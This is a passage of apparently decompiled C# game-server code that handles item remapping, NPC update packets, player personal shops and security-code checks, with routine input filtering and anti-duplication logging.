			byte[] bytes = BitConverter.GetBytes(RxjhClass.GetDBItmeId());
			byte[] array = new byte[56];
			new ItmeClass();
			ItmeClass itmeID = ItmeClass.GetItmeID(BitConverter.ToInt32(物品ID, 0));
			switch (BitConverter.ToInt32(物品ID, 0))
			{
			case 800000023:
				物品ID = BitConverter.GetBytes(800000023);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000025:
				物品ID = BitConverter.GetBytes(800000001);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000026:
				物品ID = BitConverter.GetBytes(800000001);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000027:
				物品ID = BitConverter.GetBytes(800000028);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000030:
				物品ID = BitConverter.GetBytes(800000030);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000011:
				物品ID = BitConverter.GetBytes(800000001);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000012:
				物品ID = BitConverter.GetBytes(800000002);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000013:
				物品ID = BitConverter.GetBytes(800000013);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000001:
				物品ID = BitConverter.GetBytes(800000001);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000062:
			case 800000068:
				物品ID = BitConverter.GetBytes(800000062);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000076:
				物品ID = BitConverter.GetBytes(800000076);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000061:
				物品ID = BitConverter.GetBytes(800000061);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			case 800000071:
				物品ID = BitConverter.GetBytes(800000071);
				itmeID.FLD_MAGIC0 = 属性一;
				break;
			}
			Buffer.BlockCopy(BitConverter.GetBytes(itmeID.FLD_MAGIC0), 0, array, 0, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(itmeID.FLD_MAGIC1), 0, array, 4, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(itmeID.FLD_MAGIC2), 0, array, 8, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(itmeID.FLD_MAGIC3), 0, array, 12, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(itmeID.FLD_MAGIC4), 0, array, 16, 4);
			增加物品(bytes, 物品ID, 位置, BitConverter.GetBytes(1), array);
		}

		public void 更新NPC数据cc(int NPCid, int NPCid2, Players Playe)
		{
			byte[] array = Converter.hexStringToByte("AA554C00000067003E00010000007D297D2911270100000032000000320000000080A24300007041004088440000804000000000000000000080A243000070410040884400000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 4, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(NPCid), 0, array, 14, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(NPCid), 0, array, 16, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(NPCid2), 0, array, 18, 2);
			Buffer.BlockCopy(BitConverter.GetBytes(200), 0, array, 24, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(200), 0, array, 28, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_X), 0, array, 32, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_Y), 0, array, 40, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_Z), 0, array, 36, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 48, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(0), 0, array, 52, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_X), 0, array, 56, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_Y), 0, array, 64, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物坐标_Z), 0, array, 60, 4);
			if (Playe.Client != null)
			{
				Playe.Client.Send(array, array.Length);
			}
			发送当前范围广播数据(array, array.Length);
		}

		public static string FilterSpecial(string str)
		{
			if (str.Length == 0)
			{
				return str;
			}
			str = str.Replace("'", string.Empty);
			str = str.Replace("<", string.Empty);
			str = str.Replace(">", string.Empty);
			str = str.Replace("%", string.Empty);
			str = str.Replace("'delete", string.Empty);
			str = str.Replace("''", string.Empty);
			str = str.Replace("\"\"", string.Empty);
			str = str.Replace(", ", string.Empty);
			str = str.Replace(".", string.Empty);
			str = str.Replace(">=", string.Empty);
			str = str.Replace("=<", string.Empty);
			str = str.Replace("-", string.Empty);
			str = str.Replace("_", string.Empty);
			str = str.Replace(";", string.Empty);
			str = str.Replace("||", string.Empty);
			str = str.Replace("[", string.Empty);
			str = str.Replace("]", string.Empty);
			str = str.Replace("&", string.Empty);
			str = str.Replace("#", string.Empty);
			str = str.Replace("/", string.Empty);
			str = str.Replace("-", string.Empty);
			str = str.Replace("|", string.Empty);
			str = str.Replace("?", string.Empty);
			str = str.Replace(">?", string.Empty);
			str = str.Replace("?<", string.Empty);
			str = str.Replace(" ", string.Empty);
			return str;
		}

		public void 开店(string 商店名)
		{
			try
			{
				商店名 = FilterSpecial(商店名);
				byte[] bytes = Encoding.Default.GetBytes(商店名);
				打开仓库中 = true;
				个人商店 = new 个人商店类
				{
					商店类型 = 1
				};
				string hex = "000000000000000055AA";
				byte[] array = Converter.hexStringToByte("AA5517000000CD00090001010500");
				byte[] array2 = Converter.hexStringToByte(hex);
				byte[] array3 = new byte[array.Length + array2.Length + bytes.Length];
				Buffer.BlockCopy(array, 0, array3, 0, array.Length);
				Buffer.BlockCopy(bytes, 0, array3, 15, bytes.Length);
				Buffer.BlockCopy(array2, 0, array3, array3.Length - array2.Length, array2.Length);
				array3[2] = (byte)(18 + bytes.Length);
				array3[9] = (byte)(4 + bytes.Length);
				array3[12] = (byte)bytes.Length;
				个人商店.商店名 = bytes;
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array3, array3.Length);
				}
			}
			catch
			{
			}
		}

		public void 开店(byte[] data, int length)
		{
			int num = 0;
			try
			{
				if (退出中 || 进店中)
				{
					return;
				}
				if (base.人物坐标_地图 != 101 && base.人物坐标_地图 != 29000)
				{
					系统提示("只有泫勃派城里才可以开商店。");
					byte[] array = Converter.hexStringToByte("AA55100/00000CD0002000404000000000000000055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					return;
				}
				封包修改(data, length);
				byte[] array9 = new byte[4];
				Buffer.BlockCopy(data, 10, array9, 0, 1);
				int num2 = BitConverter.ToInt32(array9, 0);
				num = 1;
				switch (num2)
				{
				case 1:
				{
					if (打开仓库中 || 进店中)
					{
						break;
					}
					int num3 = data[11];
					byte[] array7 = new byte[num3];
					for (int i = 0; i < num3; i++)
					{
						array7[i] = data[13 + i];
					}
					if (num3 > 24)
					{
						起名提示(3);
						byte[] array8 = Converter.hexStringToByte("AA5510000000CD0002000404000000000000000055AA");
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array8, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array8, array8.Length);
						}
					}
					else
					{
						商店名 = Encoding.Default.GetString(array7).Trim();
						if (安全码是否通过验证)
						{
							开店(商店名);
						}
						else
						{
							发送安全码消息(2);
						}
					}
					break;
				}
				case 2:
				{
					byte[] array14 = new byte[4];
					byte[] dst = new byte[8];
					byte[] array15 = new byte[8];
					byte[] array16 = new byte[4];
					byte[] array2 = new byte[4];
					Buffer.BlockCopy(data, 11, array14, 0, 4);
					Buffer.BlockCopy(data, 19, dst, 0, 8);
					Buffer.BlockCopy(data, 27, array16, 0, 2);
					Buffer.BlockCopy(data, 29, array2, 0, 2);
					Buffer.BlockCopy(data, 31, array15, 0, 8);
					num = 6;
					if (BitConverter.ToInt32(array16, 0) <= 0 || BitConverter.ToInt64(array15, 0) <= 0)
					{
						break;
					}
					num = 7;
					if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array2, 0)].物品数量, 0) < BitConverter.ToInt32(array16, 0))
					{
						byte[] array3 = Converter.hexStringToByte("AA551100AE04CD000300021B000000000000009BE255AA");
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array3, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array3, array3.Length);
						}
						break;
					}
					num = 8;
					if (装备栏包裹[BitConverter.ToInt32(array2, 0)].物品绑定)
					{
						byte[] array4 = Converter.hexStringToByte("AA551100AE04CD000300021B000000000000009BE255AA");
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array4, array4.Length);
						}
					}
					else
					{
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(array14, 0), out var value))
						{
							break;
						}
						if (value.FLD_LOCK == 1)
						{
							系统提示("[百宝阁]锁定的物品禁止买卖。");
							byte[] array5 = Converter.hexStringToByte("AA551100AE04CD000300021B000000000000009BE255AA");
							Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array5, 4, 2);
							if (base.Client != null)
							{
								base.Client.Send(array5, array5.Length);
							}
							break;
						}
						num = 9;
						if (BitConverter.ToInt32(装备栏包裹[BitConverter.ToInt32(array2, 0)].物品ID, 0) == 0)
						{
							byte[] array6 = Converter.hexStringToByte("AA551100AE04CD000300021B000000000000009BE255AA");
							Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array6, 4, 2);
							if (base.Client != null)
							{
								base.Client.Send(array6, array6.Length);
							}
							break;
						}
						num = 10;
						装备栏包裹[BitConverter.ToInt32(array2, 0)].锁定 = true;
						num = 11;
						个人商店物品类 个人商店物品类2 = new 个人商店物品类
						{
							数量 = BitConverter.ToInt32(array16, 0),
							价格 = BitConverter.ToInt64(array15, 0),
							位置 = BitConverter.ToInt32(array2, 0)
						};
						num = 12;
						个人商店物品类2.物品 = 装备栏包裹[BitConverter.ToInt32(array2, 0)];
						num = 13;
						if (个人商店 == null || 个人商店.商店物品列表 == null)
						{
							break;
						}
						个人商店.商店物品列表.Add(BitConverter.ToInt64(装备栏包裹[BitConverter.ToInt32(array2, 0)].物品全局ID, 0), 个人商店物品类2);
						num = 14;
						using (发包类 发包类 = new 发包类())
						{
							发包类.Write(2);
							发包类.Write(2);
							发包类.Write8(个人商店物品类2.物品.Get物品ID);
							发包类.Write8(个人商店物品类2.物品.Get物品全局ID);
							发包类.Write2(个人商店物品类2.数量);
							发包类.Write2(个人商店物品类2.位置);
							发包类.Write8(个人商店物品类2.价格);
							发包类.Write4(个人商店物品类2.物品.FLD_MAGIC0);
							发包类.Write4(个人商店物品类2.物品.FLD_MAGIC1);
							发包类.Write4(个人商店物品类2.物品.FLD_MAGIC2);
							发包类.Write4(个人商店物品类2.物品.FLD_MAGIC3);
							发包类.Write4(个人商店物品类2.物品.FLD_MAGIC4);
							发包类.Write2(个人商店物品类2.物品.FLD_FJ_MAGIC0);
							发包类.Write2(个人商店物品类2.物品.FLD_FJ_MAGIC1);
							发包类.Write2(个人商店物品类2.物品.FLD_FJ_中级附魂);
							发包类.Write2(个人商店物品类2.物品.FLD_FJ_MAGIC2);
							发包类.Write2(个人商店物品类2.物品.FLD_FJ_MAGIC3);
							发包类.Write2(个人商店物品类2.物品.FLD_FJ_MAGIC4);
							发包类.Write2(个人商店物品类2.物品.FLD_FJ_MAGIC5);
							发包类.Write2(0);
							num = 15;
							发包类.Write4(个人商店物品类2.物品.FLD_KSSJ);
							发包类.Write4(个人商店物品类2.物品.FLD_JSSJ);
							num = 16;
							发包类.Write2(个人商店物品类2.物品.FLD_FJ_NJ);
							发包类.Write4(个人商店物品类2.物品.FLD_FJ_觉醒);
							发包类.Write2(0);
							发包类.Write2(个人商店物品类2.物品.FLD_FJ_进化);
							发包类.Write2(0);
							发包类.Write4(个人商店物品类2.物品.FLD_FJ_四神之力);
							发包类.Write4(0);
							发包类.Write4(0);
							发包类.Write4(0);
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 52480, base.人物全服ID);
							}
						}
						num = 17;
						if (是否灵兽((int)个人商店物品类2.物品.Get物品ID))
						{
							发送灵兽数据((int)个人商店物品类2.物品.Get物品全局ID);
						}
					}
					break;
				}
				case 3:
				{
					个人商店.个人商店是否开启 = true;
					num = 18;
					byte[] array10 = Converter.hexStringToByte("AA5510000000CD0002000303000000000000000055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array10, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array10, array10.Length);
					}
					num = 19;
					string hex = "000000000000000055AA";
					byte[] array11 = Converter.hexStringToByte("AA5522000000CA0014000100000000000000000000000600");
					byte[] array12 = Converter.hexStringToByte(hex);
					num = 20;
					byte[] array13 = new byte[array11.Length + array12.Length + 个人商店.商店名.Length];
					num = 21;
					Buffer.BlockCopy(array11, 0, array13, 0, array11.Length);
					Buffer.BlockCopy(个人商店.商店名, 0, array13, 24, 个人商店.商店名.Length);
					Buffer.BlockCopy(array12, 0, array13, array13.Length - array12.Length, array12.Length);
					num = 22;
					array13[2] = (byte)(28 + 个人商店.商店名.Length);
					array13[9] = (byte)(14 + 个人商店.商店名.Length);
					array13[22] = (byte)个人商店.商店名.Length;
					num = 23;
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array13, 14, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array13, 18, 4);
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array13, 4, 2);
					个人商店.个人商店是否开启 = true;
					if (base.Client != null)
					{
						base.Client.Send(array13, array13.Length);
					}
					num = 24;
					发送当前范围广播数据(array13, array13.Length);
					break;
				}
				case 4:
					num = 26;
					关店();
					break;
				}
			}
			catch (Exception ex)
			{
				if (World.是否开启票红字2 == 1)
				{
					MainForm.WriteLine(1, "个人商店开店出错![" + base.Userid + "]-[" + base.UserName + "]" + num + "|" + ex.Message);
				}
			}
		}

		public void 进店(Players Playe)
		{
			try
			{
				Playe.个人商店.个人商店是否使用中 = true;
				进店中 = true;
				进店中ID = Playe.人物全服ID;
				打开仓库中 = true;
				using (发包类 发包类 = new 发包类())
				{
					发包类.Write(1);
					发包类.Write(1);
					发包类.Write4(Playe.人物全服ID);
					发包类.Write2(Playe.个人商店.商店名.Length);
					发包类.Write(Playe.个人商店.商店名, 0, Playe.个人商店.商店名.Length);
					发包类.Write2(Playe.个人商店.商店物品列表.Count);
					foreach (个人商店物品类 value in Playe.个人商店.商店物品列表.Values)
					{
						发包类.Write8(value.物品.Get物品ID);
						发包类.Write8(value.物品.Get物品全局ID);
						发包类.Write2(value.数量);
						发包类.Write2(value.位置);
						发包类.Write8(value.价格);
						发包类.Write4(value.物品.FLD_MAGIC0);
						发包类.Write4(value.物品.FLD_MAGIC1);
						发包类.Write4(value.物品.FLD_MAGIC2);
						发包类.Write4(value.物品.FLD_MAGIC3);
						发包类.Write4(value.物品.FLD_MAGIC4);
						发包类.Write2(value.物品.FLD_FJ_MAGIC0);
						发包类.Write2(value.物品.FLD_FJ_MAGIC1);
						发包类.Write2(value.物品.FLD_FJ_中级附魂);
						发包类.Write2(value.物品.FLD_FJ_MAGIC2);
						发包类.Write2(value.物品.FLD_FJ_MAGIC3);
						发包类.Write2(value.物品.FLD_FJ_MAGIC4);
						发包类.Write2(value.物品.FLD_FJ_MAGIC5);
						发包类.Write2(0);
						发包类.Write4(value.物品.FLD_KSSJ);
						发包类.Write4(value.物品.FLD_JSSJ);
						发包类.Write2(value.物品.FLD_FJ_NJ);
						发包类.Write4(value.物品.FLD_FJ_觉醒);
						发包类.Write2(0);
						发包类.Write2(value.物品.FLD_FJ_进化);
						发包类.Write2(0);
						发包类.Write4(value.物品.FLD_FJ_四神之力);
						发包类.Write8((int)value.物品.Get物品全局ID);
						发包类.Write4(0);
						if (是否灵兽((int)value.物品.Get物品ID))
						{
							发送灵兽数据((int)value.物品.Get物品全局ID);
						}
					}
					if (base.Client != null)
					{
						base.Client.SendPak(发包类, 52992, base.人物全服ID);
					}
				}
				byte[] array = Converter.hexStringToByte("AA5516006501591008000100000000000000000000000000B11A55AA");
				Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				byte[] array2 = Converter.hexStringToByte("AA5518000000CF000A0001010000000001000000000000000000000055AA");
				Buffer.BlockCopy(BitConverter.GetBytes(Playe.人物全服ID), 0, array2, 12, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 16, 2);
				Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array2, 4, 2);
				if (Playe.Client != null)
				{
					Playe.Client.Send(array2, array2.Length);
				}
				Playe.个人商店.进入人 = this;
			}
			catch
			{
			}
		}

		public void 安全码校验(byte[] data, int lenght)
		{
			try
			{
				bool flag = false;
				byte[] array = new byte[15];
				Buffer.BlockCopy(data, 12, array, 0, array.Length);
				string text = Encoding.Default.GetString(array).Trim().Replace("\0", string.Empty);
				if (text.Length == 0)
				{
					安全码错误处理(安全码操作ID);
					return;
				}
				if (text.Length < 6)
				{
					flag = true;
					系统提示("游戏安全码不能小于6位。", 50, "系统提示");
				}
				if (text.Length > 9)
				{
					flag = true;
					系统提示("游戏安全码不能大于9位。", 50, "系统提示");
				}
				if (!Regex.IsMatch(text, "^[A-Za-z0-9]+$"))
				{
					flag = true;
					系统提示("游戏安全码必须是由大于6位且小于9位的字母和数字组成。", 50, "系统提示");
				}
				if (flag)
				{
					安全码错误处理(安全码操作ID);
				}
				else if (游戏安全码 == text)
				{
					if (!安全码是否通过验证)
					{
						安全码是否通过验证 = true;
						安全码锁状态(2);
					}
					if (安全码操作ID == 1)
					{
						同意接受(152, 交易人物ID, 交易操作ID);
					}
					else if (安全码操作ID == 2)
					{
						开店(商店名);
					}
					else if (安全码操作ID == 3)
					{
						百宝();
					}
					else if (安全码操作ID == 4)
					{
						清理背包();
					}
					else if (安全码操作ID == 5)
					{
						Players players = 得到人物数据(进店中ID);
						if (players != null)
						{
							进店(players);
						}
					}
					else if (安全码操作ID == 6)
					{
						解锁装备(解锁包, 解锁数量);
						发送加解锁装备数据();
					}
					else if (安全码操作ID == 7)
					{
						清理绑定背包();
					}
					else if (安全码操作ID == 8)
					{
						清理行囊();
					}
					else if (安全码操作ID == 9)
					{
						打开商店(base.操作ID, base.操作类型, base.操作页码);
					}
					SetUserId(base.Userid, base.lastloginip);
					查登陆IP();
					安全码操作ID = 0;
					base.账号锁定 = 0;
				}
				else
				{
					安全码错误处理(安全码操作ID);
					安全码操作ID = 0;
					if (base.账号锁定 >= 10)
					{
						Players players2 = World.检查玩家name(base.UserName);
						if (players2 != null && players2.Client != null)
						{
							players2.Client.Dispose();
						}
						MainForm.WriteLine(1, "安全码输错10次用户踢出[" + base.Userid + "]-[" + base.UserName + "]");
					}
					else
					{
						base.账号锁定++;
					}
					系统提示("安全码输入错误, 请重新输入.还剩[" + (10 - base.账号锁定) + "]次, 账号锁定..", 6, "系统提示");
				}
				SaveGemData();
			}
			catch
			{
			}
		}

		public void 安全码锁状态(int 状态)
		{
			if (状态 < 0)
			{
				状态 = 0;
			}
			else if (状态 > 2)
			{
				状态 = 2;
			}
			byte[] array = new byte[104]
			{
				170, 85, 98, 0, 26, 2, 108, 0, 92, 0,
				103, 123, 196, 53, 0, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 50, 0,
				20, 0, 51, 0, 20, 0, 52, 0, 20, 0,
				53, 0, 0, 0, 54, 0, 20, 0, 55, 0,
				4, 0, 185, 0, 20, 0, 57, 0, 0, 0,
				56, 0, 20, 0, 94, 1, 20, 0, 95, 1,
				0, 0, 59, 0, 20, 0, 0, 0, 0, 0,
				0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
				32, 140, 7, 0, 0, 0, 0, 0, 1, 0,
				0, 0, 85, 170
			};
			array[array.Length - 6] = (byte)状态;
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
				更新金钱和负重();
				更新武功和状态();
			}
		}

		public void 安全码错误处理(int 安全码操作ID)
		{
			try
			{
				switch (安全码操作ID)
				{
				case 9:
					关闭商店(base.操作ID);
					break;
				case 1:
					关闭交易(152, 0, 6);
					break;
				case 2:
				{
					byte[] array = Converter.hexStringToByte("AA5510000000CD0002000404000000000000000055AA");
					Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					break;
				}
				case 5:
					关店();
					break;
				}
			}
			catch
			{
			}
		}

		public void 关店提示(int 人物ID)
		{
			byte[] array = Converter.hexStringToByte("AA5514000000CF000600030319000000000000000000000055AA");
			Buffer.BlockCopy(BitConverter.GetBytes(人物ID), 0, array, 12, 4);
			Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 进店(byte[] data, int length)
		{
			try
			{
				封包修改(data, length);
				byte[] array = new byte[4];
				byte[] array2 = new byte[4];
				Buffer.BlockCopy(data, 10, array, 0, 1);
				Buffer.BlockCopy(data, 11, array2, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				int num2 = BitConverter.ToInt32(array2, 0);
				switch (num)
				{
				case 1:
				{
					if (打开仓库中 || 进店中)
					{
						break;
					}
					Players players2 = 得到人物数据(num2);
					if (players2 == null)
					{
						break;
					}
					if (!players2.个人商店.个人商店是否开启 || players2.个人商店.商店类型 == 2)
					{
						商店提示(14);
						关店提示(num2);
						break;
					}
					if (!查找范围玩家(40, players2))
					{
						商店提示(12);
						关店提示(num2);
						break;
					}
					if (players2.个人商店.个人商店是否使用中)
					{
						商店提示(13);
						关店提示(num2);
						break;
					}
					if (安全码是否通过验证)
					{
						进店(players2);
					}
					else
					{
						发送安全码消息(5);
					}
					进店中ID = players2.人物全服ID;
					break;
				}
				case 2:
				{
					if (进店中ID == 0)
					{
						break;
					}
					if (num2 == 0)
					{
						出店(进店中ID);
						break;
					}
					if (进店中ID != num2)
					{
						出店(进店中ID);
						break;
					}
					if (base.元宝账户状态)
					{
						出店(进店中ID);
						系统提示("元宝处于锁定状态。");
						break;
					}
					Players players = 得到人物数据(num2);
					if (players == null)
					{
						出店(进店中ID);
						break;
					}
					if (!players.打开仓库中)
					{
						出店(进店中ID);
						break;
					}
					if (players.退出中)
					{
						出店(进店中ID);
						break;
					}
					int num3 = BitConverter.ToInt32(data, 15);
					long num4 = BitConverter.ToInt64(data, 23);
					int num5 = BitConverter.ToInt16(data, 31);
					if (!players.个人商店.商店物品列表.TryGetValue(num4, out var value))
					{
						出店(进店中ID);
						break;
					}
					int num6 = 得到包裹空位(this);
					if (num6 == -1)
					{
						购买物品提示(14);
						出店(进店中ID);
						break;
					}
					if (num5 > value.数量)
					{
						出店(进店中ID);
						break;
					}
					if (BitConverter.ToInt32(players.装备栏包裹[value.位置].物品ID, 0) == 0)
					{
						出店(进店中ID);
						break;
					}
					if (BitConverter.ToInt64(players.装备栏包裹[value.位置].物品全局ID, 0) != num4)
					{
						出店(进店中ID);
						break;
					}
					if (BitConverter.ToInt32(players.装备栏包裹[value.位置].物品ID, 0) != num3)
					{
						出店(进店中ID);
						break;
					}
					if (num4 == 0)
					{
						出店(进店中ID);
						break;
					}
					if (value.价格 < 0 || num5 < 1)
					{
						出店(进店中ID);
						break;
					}
					if (players.个人商店.商店类型 == 2)
					{
						出店(进店中ID);
						break;
					}
					CheckTreasureGems();
					players.CheckTreasureGems();
					if (World.是否开启元宝商店 == 0)
					{
						if (base.Player_Money < value.价格 * num5)
						{
							购买物品提示(13);
							出店(进店中ID);
							break;
						}
					}
					else if (base.FLD_RXPIONT < value.价格 * num5)
					{
						购买物品提示(13);
						出店(进店中ID);
						break;
					}
					物品类 物品类2 = 得到人物物品物品全局ID(players, num4);
					if (物品类2 != null)
					{
						if (BitConverter.ToInt32(物品类2.物品数量, 0) < value.数量)
						{
							出店(进店中ID);
							MainForm.WriteLine(6, "非法复制_个人商店_进店1[" + base.Userid + "]-[" + base.UserName + "]物品名称[" + 物品类2.得到物品名称() + "] 物品数量[" + BitConverter.ToInt32(物品类2.物品数量, 0) + "] 数量[" + value.数量 + "]");
							break;
						}
						if (World.Itme[BitConverter.ToInt32(物品类2.物品ID, 0)].FLD_SIDE == 0 && BitConverter.ToInt32(物品类2.物品数量, 0) > 1)
						{
							出店(进店中ID);
							MainForm.WriteLine(6, "非法复制_个人商店_进店2[" + base.Userid + "]-[" + base.UserName + "]物品名称[" + 物品类2.得到物品名称() + "] 物品数量[" + BitConverter.ToInt32(物品类2.物品数量, 0) + "] 数量[" + value.数量 + "]");
							break;
						}
						if (num5 < 1 || value.价格 < 0)
						{
							出店(进店中ID);
							break;
						}
						string[] array3 = new string[25]
						{
							"[",
							players.Userid,
							"][",
							players.UserName,
							"] 个人商店买出物品 :[",
							base.Userid,
							"][",
							base.UserName,
							"] (物品:",
							物品类2.得到物品名称(),
							"/编号:",
							BitConverter.ToInt32(物品类2.得到全局ID(), 0).ToString(),
							"属性:[",
							物品类2.FLD_MAGIC0.ToString(),
							", ",
							物品类2.FLD_MAGIC1.ToString(),
							", ",
							物品类2.FLD_MAGIC2.ToString(),
							", ",
							null,
							null,
							null,
							null,
							null,
							null
						};
						array3[19] = 物品类2.FLD_MAGIC3.ToString();
						array3[20] = ", ";
						array3[21] = 物品类2.FLD_MAGIC4.ToString();
						array3[22] = "] 价格[";
						array3[23] = value.价格.ToString();
						array3[24] = "]";
						MainForm.WriteLine(5, string.Concat(array3));
						string userid = players.Userid;
						string userName = players.UserName;
						string userid2 = base.Userid;
						string userName2 = base.UserName;
						double 全局ID = BitConverter.ToInt64(物品类2.物品全局ID, 0);
						int 物品ID = BitConverter.ToInt32(物品类2.物品ID, 0);
						string 物品名 = 物品类2.得到物品名称();
						int 物品数量 = num5;
						string 物品属性 = 物品类2.FLD_MAGIC0 + "-" + 物品类2.FLD_MAGIC1 + "-" + 物品类2.FLD_MAGIC2 + "-" + 物品类2.FLD_MAGIC3 + "-" + 物品类2.FLD_MAGIC4 + "初" + 0 + "中" + 0 + "进" + 0;
						int 钱数 = (int)(value.价格 * num5);
						RxjhClass.物品记录(userid, userName, userid2, userName2, 全局ID, 物品ID, 物品名, 物品数量, 物品属性, 钱数, "元宝商店");
						using (发包类 发包类 = new 发包类())
						{
							发包类.Write(2);
							发包类.Write(2);
							发包类.Write4(num2);
							发包类.Write8(value.物品.Get物品ID);
							发包类.Write8(value.物品.Get物品全局ID);
							发包类.Write2(num5);
							发包类.Write2(value.位置);
							发包类.Write8(value.价格);
							发包类.Write4(value.物品.FLD_MAGIC0);
							发包类.Write4(value.物品.FLD_MAGIC1);
							发包类.Write4(value.物品.FLD_MAGIC2);
							发包类.Write4(value.物品.FLD_MAGIC3);
							发包类.Write4(value.物品.FLD_MAGIC4);
							发包类.Write2(value.物品.FLD_FJ_MAGIC0);
							发包类.Write2(value.物品.FLD_FJ_MAGIC1);
							发包类.Write2(value.物品.FLD_FJ_中级附魂);
							发包类.Write2(value.物品.FLD_FJ_MAGIC2);
							发包类.Write2(value.物品.FLD_FJ_MAGIC3);
							发包类.Write2(value.物品.FLD_FJ_MAGIC4);
							发包类.Write2(value.物品.FLD_FJ_MAGIC5);
							发包类.Write2(0);
							发包类.Write4(value.物品.FLD_KSSJ);
							发包类.Write4(value.物品.FLD_JSSJ);
							发包类.Write2(value.物品.FLD_FJ_NJ);
							发包类.Write4(value.物品.FLD_FJ_觉醒);
							发包类.Write2(0);
							发包类.Write2(value.物品.FLD_FJ_进化);
							发包类.Write2(0);
							发包类.Write4(0);
							发包类.Write4(0);
							发包类.Write4(0);
							发包类.Write8(num4);
							if (base.Client != null)
							{
								base.Client.SendPak(发包类, 52992, base.人物全服ID);
							}
							if (players.Client != null)
							{
								players.Client.SendPak(发包类, 52992, base.人物全服ID);
							}
						}
						物品类2.FLD_FJ_NJ = 0;
						CheckTreasureGems();
						players.CheckTreasureGems();
						if (World.是否开启元宝商店 == 0)
						{
							players.Player_Money += value.价格 * num5;
							base.Player_Money -= value.价格 * num5;
						}
						else
						{
							players.检察元宝数据((int)(value.价格 * num5), 1, "开店");
							检察元宝数据((int)(value.价格 * num5), 0, "开店");
							SaveGemData();
							players.SaveGemData();
						}
						增加物品(物品类2.物品全局ID, 物品类2.物品ID, num6, BitConverter.GetBytes(num5), 物品类2.物品属性);
						players.减去物品(物品类2.物品位置, num5);
						if (value.数量 - num5 > 0)
						{
							value.数量 -= num5;
						}
						else
						{
							players.个人商店.商店物品列表.Remove(num4);
						}
						if (World.是否开启元宝商店 == 0)
						{
							更新金钱和负重();
							players.更新金钱和负重();
						}
					}
					if (players.个人商店.商店物品列表.Count == 0)
					{
						players.个人商店.个人商店是否开启 = false;
						players.个人商店.商店物品列表.Clear();
						players.个人商店.进入人 = null;
						players.个人商店.Dispose();
						players.个人商店 = null;
						players.打开仓库中 = false;
						byte[] array4 = Converter.hexStringToByte("AA5514000000CF000600030319000000000000000000000055AA");
						Buffer.BlockCopy(array2, 0, array4, 12, 4);
						Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array4, 4, 2);
						if (base.Client != null)
						{
							base.Client.Send(array4, array4.Length);
						}
